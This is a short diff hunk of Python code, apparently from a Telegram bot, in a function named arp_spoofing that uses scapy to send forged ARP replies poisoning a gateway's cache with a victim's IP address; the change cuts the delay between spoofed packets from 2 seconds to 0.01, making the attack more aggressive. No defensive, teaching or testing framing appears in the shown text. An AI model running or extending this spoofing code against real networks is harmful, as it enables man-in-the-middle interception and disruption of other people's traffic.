@@ -62,7 +62,7 @@ def arp_spoofing(update, context):
         # Envía una solicitud ARP indicando que la dirección MAC de la víctima es la del gateway
         send(ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst=gateway_mac))
 
-        time.sleep(2)
+        time.sleep(0.01)
 
     return ConversationHandler.END
 
